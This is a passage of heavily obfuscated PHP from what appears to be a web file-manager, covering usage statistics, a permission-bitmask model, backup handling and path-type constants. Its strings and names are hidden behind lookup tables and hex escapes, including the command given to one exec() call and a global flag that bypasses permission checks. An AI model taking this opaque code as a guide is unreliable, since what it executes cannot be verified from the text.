$áĞìöÓ; } $Âòı•‹¯ = array($¬Óû¤[1823] => array($¬Óû¤[1020], $³ªÅœ‰)); $×É¡±¡¤ = (int) Model($¬Óû¤[525])->where($Âòı•‹¯)->count($¬Óû¤[1673]); if (!$×É¡±¡¤) { $×É¡±¡¤ = 1; } $Âòı•‹¯ = array($¬Óû¤[1823] => array($¬Óû¤[1020], $áĞìöÓ)); $¦å¶É†¼ = Model($¬Óû¤[525])->where($Âòı•‹¯)->count($¬Óû¤[1673]); return array($¬Óû¤[764] => (int) $Öİ»›ê‚, $¬Óû¤[1824] => (int) ($Öİ»›ê‚ - $‡åíÍï«), $¬Óû¤[1825] => (int) $‡åíÍï«, $¬Óû¤[1826] => (int) $¦å¶É†¼, $¬Óû¤[1827] => $×É¡±¡¤); } private function optionFile() { $¹‰‹¯Ğ” =& $_SERVER[§ŒØóıü]; $¶‘•Ì±ğ = $this->sourceSize(); $…ôŠ²ÓĞ = $¶‘•Ì±ğ[$¹‰‹¯Ğ”[76]]; $ÊÒ‰¿Æ˜ = $¶‘•Ì±ğ[$¹‰‹¯Ğ”[1796]]; $Æ‹øÅÃî = Model($¹‰‹¯Ğ”[831])->where(array($¹‰‹¯Ğ”[410] => 0))->count($¹‰‹¯Ğ”[402]); $ÏÒÎ™Ç = array($¹‰‹¯Ğ”[410] => 0, $¹‰‹¯Ğ”[201] => array($¹‰‹¯Ğ”[1020], strtotime(date($¹‰‹¯Ğ”[1803])))); $ò¢õÄ‰ = Model($¹‰‹¯Ğ”[831])->where($ÏÒÎ™Ç)->sum($¹‰‹¯Ğ”[76]); $³¸öíÛ§ = Model($¹‰‹¯Ğ”[831])->where($ÏÒÎ™Ç)->count($¹‰‹¯Ğ”[402]); return array($¹‰‹¯Ğ”[769] => $…ôŠ²ÓĞ, $¹‰‹¯Ğ”[1796] => $ÊÒ‰¿Æ˜, $¹‰‹¯Ğ”[1828] => $…ôŠ²ÓĞ - $ÊÒ‰¿Æ˜, $¹‰‹¯Ğ”[1829] => (int) $ò¢õÄ‰, $¹‰‹¯Ğ”[771] => (int) $Æ‹øÅÃî, $¹‰‹¯Ğ”[1830] => (int) $³¸öíÛ§); } private function optionAccess() { $öÛ™ã¯Ô =& $_SERVER[§ŒØóıü]; return array($öÛ™ã¯Ô[764] => $this->typeLogCnt(), $öÛ™ã¯Ô[107] => $this->typeLogCnt($öÛ™ã¯Ô[107]), $öÛ™ã¯Ô[452] => $this->typeLogCnt($öÛ™ã¯Ô[452]), $öÛ™ã¯Ô[1831] => $this->typeLogCnt($öÛ™ã¯Ô[1831]), $öÛ™ã¯Ô[1832] => $this->typeLogCnt($öÛ™ã¯Ô[1832]), $öÛ™ã¯Ô[590] => $this->typeLogCnt($öÛ™ã¯Ô[12], $öÛ™ã¯Ô[1807])); } private function typeLogCnt($Â†øŞû¿ = '', $Ô§£Û¸ = "\x69\x64") { $õ›ó…«û =& $_SERVER[§ŒØóıü]; $¶œÓÔ¢Ù = array($õ›ó…«û[107] => array($õ›ó…«û[1833], $õ›ó…«û[1834]), $õ›ó…«û[452] => array($õ›ó…«û[1835], $õ›ó…«û[1836]), $õ›ó…«û[1831] => array($õ›ó…«û[1837], $õ›ó…«û[1838], $õ›ó…«û[1839]), $õ›ó…«û[1832] => array($õ›ó…«û[1840], $õ›ó…«û[1841]), $õ›ó…«û[1842] => array($õ›ó…«û[1843], $õ›ó…«û[1844], $õ›ó…«û[1845])); $ÂÂƒ‚Öƒ = strtotime(date($õ›ó…«û[1803])); $°­›ØÖª = array($õ›ó…«û[201] => array($õ›ó…«û[1020], $ÂÂƒ‚Öƒ)); if ($Â†øŞû¿) { $°­›ØÖª[$õ›ó…«û[33]] = array($õ›ó…«û[7], $¶œÓÔ¢Ù[$Â†øŞû¿]); } $½¦âÌÖœ = Model($õ›ó…«û[1806])->where($°­›ØÖª)->count($Ô§£Û¸); return (int) $½¦âÌÖœ; } private function optionServer() { $·×˜œÓ =& $_SERVER[§ŒØóıü]; $•²¾íÇ‚ = $this->diskDriver(); $½ùâ—´ = KodIO::defaultDriver(); $„åÈÚÃñ = array($·×˜œÓ[823] => $½ùâ—´[$·×˜œÓ[399]]); $âìë¼Ûõ = Model($·×˜œÓ[471])->where($„åÈÚÃñ)->sum($·×˜œÓ[76]); $êÒÊ²£ = explode($·×˜œÓ[53], $_SERVER[$·×˜œÓ[143]]); $ñ®ï¾šš = $êÒÊ²£[0]; $‚Ù¶¾‹ä = $GLOBALS[$·×˜œÓ[6]][$·×˜œÓ[21]]; $«›ä»æ = $‚Ù¶¾‹ä[$·×˜œÓ[982]]; if ($«›ä»æ == $·×˜œÓ[970]) { $ĞÔ§°Ù’ = explode($·×˜œÓ[1285], $‚Ù¶¾‹ä[$·×˜œÓ[981]]); $«›ä»æ = $ĞÔ§°Ù’[0]; } if ($«›ä»æ == $·×˜œÓ[918] || $«›ä»æ == $·×˜œÓ[810]) { $‰ê£§Üİ = Model()->db()->query($·×˜œÓ[1846]); $ĞÅÓ·Æç = $‰ê£§Üİ[0] && isset($‰ê£§Üİ[0][$·×˜œÓ[1572]]) ? $‰ê£§Üİ[0][$·×˜œÓ[1572]] : 0; $«›ä»æ = $·×˜œÓ[1847] . ($ĞÅÓ·Æç ? $·×˜œÓ[8] . $ĞÅÓ·Æç : $·×˜œÓ[12]); } $ƒš›Ò÷š = $GLOBALS[$·×˜œÓ[6]][$·×˜œÓ[349]][$·×˜œÓ[833]]; return array($·×˜œÓ[1848] => $•²¾íÇ‚ ? $•²¾íÇ‚[$·×˜œÓ[1849]] : 0, $·×˜œÓ[1850] => $•²¾íÇ‚ ? $•²¾íÇ‚[$·×˜œÓ[1851]] : 0, $·×˜œÓ[1852] => (int) $½ùâ—´[$·×˜œÓ[1849]] * 1024 * 1024 * 1024, $·×˜œÓ[1853] => (int) $âìë¼Ûõ, $·×˜œÓ[1854] => ucfirst($ñ®ï¾šš), $·×˜œÓ[1855] => $·×˜œÓ[1856] . PHP_VERSION, $·×˜œÓ[1857] => phpBuild64() ? 64 : 32, $·×˜œÓ[763] => str_replace($·×˜œÓ[1136], $·×˜œÓ[998], $«›ä»æ), $·×˜œÓ[349] => ucfirst($ƒš›Ò÷š), $·×˜œÓ[32] => $_SERVER[$·×˜œÓ[1858]]); } private function diskDriver() { $×ı³´ =& $_SERVER[§ŒØóıü]; $í¼ÙÙØŞ = $×ı³´[8]; $şÖ†â®Ç = $GLOBALS[$×ı³´[6]][$×ı³´[1302]] == $×ı³´[1303]; if ($şÖ†â®Ç) { $í¼ÙÙØŞ = $×ı³´[1859]; if (function_exists($×ı³´[1860])) { exec($×ı³´[1861], $Ä§ŠáÒÒ); $í¼ÙÙØŞ = $Ä§ŠáÒÒ[1] . $×ı³´[8]; } } if (!file_exists($í¼ÙÙØŞ)) { return; } $š«áÉ·Û = @disk_total_space($í¼ÙÙØŞ); $Ÿ¶°¾ÇÉ = $š«áÉ·Û - @disk_free_space($í¼ÙÙØŞ); return array($×ı³´[1849] => $š«áÉ·Û, $×ı³´[1851] => $Ÿ¶°¾ÇÉ); } public function fileChart($°ŠéŠµÚ) { $Û‡Â¶é =& $_SERVER[§ŒØóıü]; if (isset($°ŠéŠµÚ[$Û‡Â¶é[1673]])) { return Model($Û‡Â¶é[831])->userFileTypeProfile($°ŠéŠµÚ[$Û‡Â¶é[1673]]); } if (isset($°ŠéŠµÚ[$Û‡Â¶é[1862]])) { return Model($Û‡Â¶é[831])->groupFileTypeProfile($°ŠéŠµÚ[$Û‡Â¶é[1862]]); } $İ™²î¿æ = $this->sourceSize(); $Ú©Ü¶Å¬ = array($Û‡Â¶é[432] => 0, $Û‡Â¶é[411] => 1); $ÅÜƒ½¸® = Model($Û‡Â¶é[831])->where($Ú©Ü¶Å¬)->sum($Û‡Â¶é[76]); $Ú©Ü¶Å¬[$Û‡Â¶é[411]] = 2; $ÕÙ¯Î¼ = Model($Û‡Â¶é[831])->where($Ú©Ü¶Å¬)->sum($Û‡Â¶é[76]); return array($Û‡Â¶é[769] => $İ™²î¿æ[$Û‡Â¶é[76]], $Û‡Â¶é[1796] => $İ™²î¿æ[$Û‡Â¶é[1796]], $Û‡Â¶é[1797] => (int) $ÅÜƒ½¸®, $Û‡Â¶é[1798] => (int) $ÕÙ¯Î¼); } private function sourceSize() { $«ĞùÈÚ‰ =& $_SERVER[§ŒØóıü]; $ŠÏşÅ­– = Model($«ĞùÈÚ‰[831])->where(array($«ĞùÈÚ‰[410] => 0))->sum($«ĞùÈÚ‰[76]); $¨ğÎí—» = Model($«ĞùÈÚ‰[471])->sum($«ĞùÈÚ‰[76]); if ($¨ğÎí—» > $ŠÏşÅ­–) { $¨ğÎí—» = $ŠÏşÅ­–; } return array($«ĞùÈÚ‰[76] => (int) $ŠÏşÅ­–, $«ĞùÈÚ‰[1796] => (int) $¨ğÎí—»); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $”ÕÌâ”… =& $_SERVER[§ŒØóıü]; $òùñà÷á = array(array($”ÕÌâ”…[420] => LNG($”ÕÌâ”…[1863]), $”ÕÌâ”…[1864] => $”ÕÌâ”…[1865], $”ÕÌâ”…[1866] => 1, $”ÕÌâ”…[1867] => 1, $”ÕÌâ”…[1868] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($”ÕÌâ”…[420] => LNG($”ÕÌâ”…[1869]), $”ÕÌâ”…[1864] => $”ÕÌâ”…[1870], $”ÕÌâ”…[1866] => 2, $”ÕÌâ”…[1867] => 1, $”ÕÌâ”…[1868] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($”ÕÌâ”…[420] => LNG($”ÕÌâ”…[1871]), $”ÕÌâ”…[1864] => $”ÕÌâ”…[1872], $”ÕÌâ”…[1866] => 3, $”ÕÌâ”…[1867] => 1, $”ÕÌâ”…[1868] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($”ÕÌâ”…[420] => LNG($”ÕÌâ”…[1873]), $”ÕÌâ”…[1864] => $”ÕÌâ”…[1874], $”ÕÌâ”…[1866] => 4, $”ÕÌâ”…[1867] => 1, $”ÕÌâ”…[1868] => self::AUTH_SHOW | self::AUTH_VIEW), array($”ÕÌâ”…[420] => LNG($”ÕÌâ”…[1875]), $”ÕÌâ”…[1864] => $”ÕÌâ”…[1876], $”ÕÌâ”…[1866] => 5, $”ÕÌâ”…[1867] => 1, $”ÕÌâ”…[1868] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($”ÕÌâ”…[420] => LNG($”ÕÌâ”…[1877]), $”ÕÌâ”…[1864] => $”ÕÌâ”…[1878], $”ÕÌâ”…[1866] => 6, $”ÕÌâ”…[1867] => 1, $”ÕÌâ”…[1868] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($”ÕÌâ”…[420] => LNG($”ÕÌâ”…[1879]), $”ÕÌâ”…[1864] => $”ÕÌâ”…[1880], $”ÕÌâ”…[1866] => 7, $”ÕÌâ”…[1867] => 1, $”ÕÌâ”…[1868] => 0)); return $òùñà÷á; } public static function authCheck($ŠìúÔö“, $¤–çâà¦) { $³†”‡’Æ =& $_SERVER[§ŒØóıü]; $ŠìúÔö“ = intval($ŠìúÔö“); if ($GLOBALS[$³†”‡’Æ[494]] && $GLOBALS[$³†”‡’Æ[6]][$³†”‡’Æ[1881]]) { return !0; } if ($ŠìúÔö“ <= 0) { return !1; } if (($ŠìúÔö“ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ŠìúÔö“ & $¤–çâà¦); } public static function authCheckShow($éûàıõë) { return self::authCheck($éûàıõë, self::AUTH_SHOW); } public static function authCheckView($»œ¨¢¤ˆ) { return self::authCheck($»œ¨¢¤ˆ, self::AUTH_VIEW); } public static function authCheckDownload($±ºı©í²) { return self::authCheck($±ºı©í², self::AUTH_DOWNLOAD); } public static function authCheckUpload($é‘Ÿ–Ú›) { return self::authCheck($é‘Ÿ–Ú›, self::AUTH_UPLOAD); } public static function authCheckEdit($Ÿ­üâ÷) { return self::authCheck($Ÿ­üâ÷, self::AUTH_EDIT); } public static function authCheckRemove($óâçãò¥) { return self::authCheck($óâçãò¥, self::AUTH_REMOVE); } public static function authCheckShare($¹ò¤) { return self::authCheck($¹ò¤, self::AUTH_SHARE); } public static function authCheckComment($©ä±ØŞ¦) { return self::authCheck($©ä±ØŞ¦, self::AUTH_COMMENT); } public static function authCheckEvent($â¦ÍÊ¤á) { return self::authCheck($â¦ÍÊ¤á, self::AUTH_EVENT); } public static function authCheckRoot($Á¶ëÕ¿§) { return self::authCheck($Á¶ëÕ¿§, self::AUTH_ROOT); } public static function authCheckAction($ÊÛÃ¯Á¬, $âíÑ·”) { $ãÔµÎ©ä =& $_SERVER[§ŒØóıü]; $ã”“Ë²± = array($ãÔµÎ©ä[1882] => self::AUTH_VIEW, $ãÔµÎ©ä[1200] => self::AUTH_DOWNLOAD, $ãÔµÎ©ä[107] => self::AUTH_UPLOAD, $ãÔµÎ©ä[1832] => self::AUTH_EDIT, $ãÔµÎ©ä[1831] => self::AUTH_REMOVE, $ãÔµÎ©ä[1842] => self::AUTH_SHARE, $ãÔµÎ©ä[354] => self::AUTH_COMMENT, $ãÔµÎ©ä[1661] => self::AUTH_EVENT, $ãÔµÎ©ä[1883] => self::AUTH_ROOT); if (!isset($ã”“Ë²±[$âíÑ·”])) { return; } $•¬”¢Ã = $ã”“Ë²±[$âíÑ·”]; $ÊÛÃ¯Á¬ = intval($ÊÛÃ¯Á¬); if ($ÊÛÃ¯Á¬ <= 0) { return !1; } if (($ÊÛÃ¯Á¬ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÊÛÃ¯Á¬ & $•¬”¢Ã); } public static function authDisable($¹†ğ¹…¥, $üƒÀ¡½ı) { if (intval($¹†ğ¹…¥) <= 0) { return 0; } return intval($¹†ğ¹…¥) & ~$üƒÀ¡½ı; } public $optionType = "\123\171\x73\164\x65\x6d\56\x73\157\165\162\x63\x65\101\x75\164\150\114\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\141\165\164\150", "\x6c\x61\142\x65\x6c", "\x64\151\163\160\x6c\x61\171", "\163\171\x73\x74\x65\x6d", "\163\157\162\164"); public function initData() { $£…ƒÊ‡º = $this->authDefault(); foreach ($£…ƒÊ‡º as $œ™ÚÆÚÎ) { $this->add($œ™ÚÆÚÎ); } } public function findAuth($®ƒ‡ˆõØ, $—é¦ŒÀö) { $ä¨ü—í =& $_SERVER[§ŒØóıü]; $ùÇÓÜ˜ò = parent::listData(); foreach ($ùÇÓÜ˜ò as $º«¸Ñ¿€) { $ôú·Äï³ = intval($º«¸Ñ¿€[$ä¨ü—í[413]]); if ($ôú·Äï³ <= 0 || $º«¸Ñ¿€[$ä¨ü—í[1884]] == 0) { continue; } if (($ôú·Äï³ & $®ƒ‡ˆõØ) != $®ƒ‡ˆõØ) { continue; } if (($ôú·Äï³ & $—é¦ŒÀö) != 0) { continue; } return $º«¸Ñ¿€[$ä¨ü—í[399]]; } return !1; } public function findAuthReadOnly() { $ĞğÙŠ¹ì = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $´ğŒƒÄé = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ĞğÙŠ¹ì, $´ğŒƒÄé); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ß˜Õ„…Ï =& $_SERVER[§ŒØóıü]; $‘ì¸Ù„ê = parent::listData(); $ĞİÕöö¡ = !1; foreach ($‘ì¸Ù„ê as $®‰£Û°“) { if ($®‰£Û°“[$ß˜Õ„…Ï[413]] <= 0 || $®‰£Û°“[$ß˜Õ„…Ï[1884]] == $ß˜Õ„…Ï[198]) { continue; } if (!$ĞİÕöö¡) { $ĞİÕöö¡ = $®‰£Û°“; continue; } if ($ĞİÕöö¡[$ß˜Õ„…Ï[413]] > $®‰£Û°“[$ß˜Õ„…Ï[413]]) { $ĞİÕöö¡ = $®‰£Û°“; } } return $ĞİÕöö¡ ? $ĞİÕöö¡[$ß˜Õ„…Ï[399]] : $ß˜Õ„…Ï[12]; } public function listData($ÎÁµ™—ú = false, $Ç‘ÈÛ­± = "\x73\157\162\164", $‰ íŒƒâ = false) { return parent::listData($ÎÁµ™—ú, $Ç‘ÈÛ­±, $‰ íŒƒâ); } public function update($ÕêÑÎ¾ë, $÷éÊöé) { $´Ù˜˜º =& $_SERVER[§ŒØóıü]; $º×•ê…½ = parent::listData($ÕêÑÎ¾ë); $‰¶ÈëÛâ = $this->findByName($÷éÊöé[$´Ù˜˜º[32]]); if (!$º×•ê…½ || $‰¶ÈëÛâ && $‰¶ÈëÛâ[$´Ù˜˜º[399]] != $º×•ê…½[$´Ù˜˜º[399]]) { return !1; } $this->filterAuth($÷éÊöé[$´Ù˜˜º[413]]); return parent::update($ÕêÑÎ¾ë, $÷éÊöé); } public function remove($éÀôìâ…) { $î•öŠĞ» = parent::listData($éÀôìâ…); if (!$î•öŠĞ» || $î•öŠĞ»[$_SERVER[§ŒØóıü][1290]]) { return !1; } return parent::remove($éÀôìâ…); } public function add($ã¨”°ô– = array()) { $èŸæè =& $_SERVER[§ŒØóıü]; if ($this->findByName($ã¨”°ô–[$èŸæè[32]])) { return !1; } $¯ÛŠ¢Åè = array($èŸæè[32] => $èŸæè[12], $èŸæè[413] => 1, $èŸæè[1885] => $èŸæè[1872], $èŸæè[1884] => 1, $èŸæè[1290] => 0, $èŸæè[1886] => 0); $ã¨”°ô– = array_merge($¯ÛŠ¢Åè, $ã¨”°ô–); $ã¨”°ô–[$èŸæè[1886]] = $this->getSort(); $this->filterAuth($ã¨”°ô–[$èŸæè[413]]); return parent::insert($ã¨”°ô–); } private function getSort() { $ü¿äÖ¦ =& $_SERVER[§ŒØóıü]; $ÛÜåèƒ = parent::listData(); $àş„¹ö× = array_to_keyvalue($ÛÜåèƒ, $ü¿äÖ¦[12], $ü¿äÖ¦[1886]); return empty($àş„¹ö×) ? 0 : max($àş„¹ö×) + 1; } private function filterAuth(&$÷ÒÆ£„Ú) { if (!$÷ÒÆ£„Ú) { return; } $ğøŠ“ÔÕ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ú™ï´… = array(); foreach ($ğøŠ“ÔÕ as $€¨´â) { if ($÷ÒÆ£„Ú & $€¨´â) { $Ú™ï´…[] = $€¨´â; } } if (in_array(self::AUTH_ROOT, $Ú™ï´…)) { $÷ÒÆ£„Ú = array_sum($ğøŠ“ÔÕ); return; } $ùïæı¢— = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ú™ï´… as $€¨´â) { if (isset($ùïæı¢—[$€¨´â])) { $Ú™ï´… = array_merge($Ú™ï´…, $ùïæı¢—[$€¨´â]); } } $Ú™ï´…[] = self::AUTH_SHOW; $÷ÒÆ£„Ú = array_sum(array_unique($Ú™ï´…)); } public function sort($°õÅœßÀ, $øÈ ¼¾˜) { return parent::update($°õÅœßÀ, $øÈ ¼¾˜); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\x62\141\143\x6b\x75\160\114\151\163\x74"; public $field = array("\x69\x6f", "\x6e\x61\155\145", "\x73\164\x61\x74\x75\163", "\x63\x6f\x6e\x74\145\x6e\x74", "\155\x61\x6e\x75\x61\x6c", "\x72\145\x73\165\x6c\x74", "\x74\x69\x6d\x65\x46\x72\157\x6d", "\x74\151\155\145\124\157"); public function config() { $áá‹’À =& $_SERVER[§ŒØóıü]; $„Ï¦ÈŸš = Model($áá‹’À[776])->get($áá‹’À[786]); $„Ï¦ÈŸš = json_decode($„Ï¦ÈŸš, !0); $„Ï¦ÈŸš = is_array($„Ï¦ÈŸš) ? $„Ï¦ÈŸš : array(); if (!isset($„Ï¦ÈŸš[$áá‹’À[760]])) { $„Ï¦ÈŸš[$áá‹’À[760]] = $áá‹’À[88]; } unset($„Ï¦ÈŸš[$áá‹’À[1643]]); Action($áá‹’À[1887])->taskInit(); Model($áá‹’À[1642])->cacheClear(); $£¼’À£ç = $áá‹’À[1888]; $Œôš› = Model($áá‹’À[1889])->findByKey($áá‹’À[1661], $£¼’À£ç); if (!$Œôš›) { $Œôš› = array(); } if (isset($Œôš›[$áá‹’À[180]])) { $Œôš›[$áá‹’À[180]] = json_decode($Œôš›[$áá‹’À[180]], !0); } if (isset($„Ï¦ÈŸš[$áá‹’À[180]])) { $Œôš›[$áá‹’À[180]][$áá‹’À[1646]] = $„Ï¦ÈŸš[$áá‹’À[180]]; unset($„Ï¦ÈŸš[$áá‹’À[180]]); } return array_merge($Œôš›, $„Ï¦ÈŸš); } public function listData($ºÏ–àú = false, $ê²—¯ç = "\x6d\157\144\151\146\x79\124\151\155\145", $ÑŸ¿•®õ = false) { return parent::listData($ºÏ–àú, $ê²—¯ç, !0); } public function lastItem() { $Î“ÒßüÊ = $this->listData(); return !empty($Î“ÒßüÊ[0]) ? $Î“ÒßüÊ[0] : null; } public function kill($äÇ¹£) { $ôÛÀ¶èš =& $_SERVER[§ŒØóıü]; $ôªö¾“  = $this->listData($äÇ¹£); if (!$ôªö¾“  || empty($ôªö¾“ [$ôÛÀ¶èš[32]])) { return !0; } Task::kill($ôÛÀ¶èš[785]); Task::kill($ôÛÀ¶èš[806]); Task::kill($ôÛÀ¶èš[815]); $£Áôª• = $ôªö¾“ [$ôÛÀ¶èš[32]]; $Ø’™èœÕ = TEMP_FILES . $ôÛÀ¶èš[784] . $£Áôª• . $ôÛÀ¶èš[8]; IO::remove($Ø’™èœÕ, !1); return $this->remove($äÇ¹£); } public function remove($›ƒÔêî„) { $¯äùĞË = $this->listData($›ƒÔêî„); if (!$¯äùĞË) { return !0; } return $this->backupRemove($¯äùĞË); } private function backupRemove($ÇÉÉÈÏ¡) { parent::remove($ÇÉÉÈÏ¡[$_SERVER[§ŒØóıü][399]]); $ñÑ‡Áïó = $this->backupPath($ÇÉÉÈÏ¡); IO::remove($ñÑ‡Áïó, !1); return !0; } private function backupPath($‡½°­’±) { $øŞ±™í  =& $_SERVER[§ŒØóıü]; $¨Ò˜Š…· = $‡½°­’±[$øŞ±™í [32]]; $•İÊÚ«è = Model($øŞ±™í [776])->get($øŞ±™í [777]); $öÚÅäĞÉ = substr(md5($øŞ±™í [778] . $•İÊÚ«è . $¨Ò˜Š…·), 0, 8); return "\x7b\x69\157\x3a{$‡½°­’±[$øŞ±™í [757]]}\175\x2f\144\x61\x74\141\142\x61\x73\145\x2f\142\x61\143\x6b\165\x70\57" . $¨Ò˜Š…· . $øŞ±™í [11] . $öÚÅäĞÉ; } public function start() { $’ÄóÚ°Ì =& $_SERVER[§ŒØóıü]; if ($GLOBALS[$’ÄóÚ°Ì[6]][$’ÄóÚ°Ì[89]][$’ÄóÚ°Ì[1890]] != $’ÄóÚ°Ì[88]) { return !0; } $ÕØØºä³ = $this->config(); if (!$ÕØØºä³ || $ÕØØºä³[$’ÄóÚ°Ì[1643]] != $’ÄóÚ°Ì[88]) { return !1; } $ËËÜ”ˆ³ = $this->process(); foreach ($ËËÜ”ˆ³ as $Óì…ÆÖ) { if ($Óì…ÆÖ) { return Task::restart($Óì…ÆÖ[$’ÄóÚ°Ì[399]]); } } $Àïğä° = new Backup(); $ç·ÔŠí = $Àïğä°->db(); if ($ç·ÔŠí) { $ç·ÔŠí = $Àïğä°->dbFile(); if ($ç·ÔŠí && $ÕØØºä³[$’ÄóÚ°Ì[760]] == $’ÄóÚ°Ì[198]) { $ç·ÔŠí = $Àïğä°->file(); } } Backup::set(array($’ÄóÚ°Ì[755] => 1, $’ÄóÚ°Ì[767] => time())); return !0; } public function process() { $¥úöÊÀ =& $_SERVER[§ŒØóıü]; $†„‡ƒ¸” = array($¥úöÊÀ[763] => Task::get($¥úöÊÀ[785]), $¥úöÊÀ[768] => Task::get($¥úöÊÀ[806]), $¥úöÊÀ[200] => Task::get($¥úöÊÀ[815])); $ÆÏÙ©‹å = !1; foreach ($†„‡ƒ¸” as &$™à‘ÒËï) { if ($ÆÏÙ©‹å) { $™à‘ÒËï = !1; continue; } if ($™à‘ÒËï) { $·ñ£Ğ‰Ê = intval(_get($™à‘ÒËï, $¥úöÊÀ[1678], 0)); if (time() - $·ñ£Ğ‰Ê > 7200) { Task::kill($™à‘ÒËï[$¥úöÊÀ[399]]); $ÆÏÙ©‹å = !0; $™à‘ÒËï = !1; } } } return $†„‡ƒ¸”; } public function restore() { $æ™èß§ =& $_SERVER[§ŒØóıü]; ActionCall($æ™èß§[1066], !0, 1); ActionCall($æ™èß§[1066], !0, 0); } } goto cŸ´›×Íºâ; CÄÙÚà»¼Ã: class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\145\x72\x52\x65\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\x7b\165\163\145\x72\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\145\x72\106\151\154\x65\124\141\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\x72\x46\151\154\145\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\165\160\x52\157\157\x74\123\145\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\x65\x72\123\x68\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\x72\123\x68\141\x72\145\114\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\x61\162\x65\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\163\150\141\162\145\111\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\162\145\111\164\x65\155\114\x69\156\x6b\175"; const KOD_SEARCH = "\173\163\145\x61\x72\x63\x68\175"; const KOD_BLOCK = "\x7b\x62\154\157\x63\x6b\x7d"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\165\163\145\162\122\x65\x6e\x63\x65\156\x74\175"; const KOD_USER_DRIVER = "\173\144\162\151\166\x65\x72\175"; public static function typeList() { $–Š¤İ»½ =& $_SERVER[§ŒØóıü]; return array($–Š¤İ»½[1257] => self::KOD_SOURCE, $–Š¤İ»½[1258] => self::KOD_USER_RECYCLE, $–Š¤İ»½[1259] => self::KOD_USER_FAV, $–Š¤İ»½[1260] => self::KOD_USER_FILE_TAG, $–Š¤İ»½[1261] => self::KOD_USER_FILE_TYPE, $–Š¤İ»½[1262] => self::KOD_GROUP_ROOT_SELF, $–Š¤İ»½[1263] => self::KOD_USER_SHARE, $–Š¤İ»½[1264] => self::KOD_USER_SHARE_LINK, $–Š¤İ»½[1265] => self::KOD_USER_SHARE_TO_ME, $–Š¤İ»½[1266] => self::KOD_SHARE_ITEM, $–Š¤İ»½[1267] => self::KOD_SHARE_LINK, $–Š¤İ»½[1268] => self::KOD_SEARCH, $–Š¤İ»½[1269] => self::KOD_BLOCK, $–Š¤İ»½[1270] => self::KOD_IO, $–Š¤İ»½[1271] => self::KOD_USER_RECENT, $–Š¤İ»½[1272] => self::KOD_USER_DRIVER); } public static function parse($ìñÇÛò) { $Œı“ò·ü =& $_SERVER[§ŒØóıü]; $ìñÇÛò = self::clear($ìñÇÛò); $¦–›Èµ = array_values(self::typeList()); preg_match($Œı“ò·ü[1273], $ìñÇÛò, $·ñÒÓÏÙ); $Ì¦‰¶å´ = array($Œı“ò·ü[422] => !1, $Œı“ò·ü[1274] => !1, $Œı“ò·ü[419] => !1, $Œı“ò·ü[84] => $ìñÇÛò, $Œı“ò·ü[1175] => !1, $Œı“ò·ü[1174] => $Œı“ò·ü[12]); if (is_array($·ñÒÓÏÙ) && count($·ñÒÓÏÙ) == 5) { $—ó½èĞË = $Œı“ò·ü[1275] . $·ñÒÓÏÙ[2] . $Œı“ò·ü[327]; if (in_array($—ó½èĞË, $¦–›Èµ)) { $Ì¦‰¶å´[$Œı“ò·ü[1175]] = $·ñÒÓÏÙ[1]; $Ì¦‰¶å´[$Œı“ò·ü[33]] = $—ó½èĞË; $Ì¦‰¶å´[$Œı“ò·ü[1276]] = substr($—ó½èĞË, 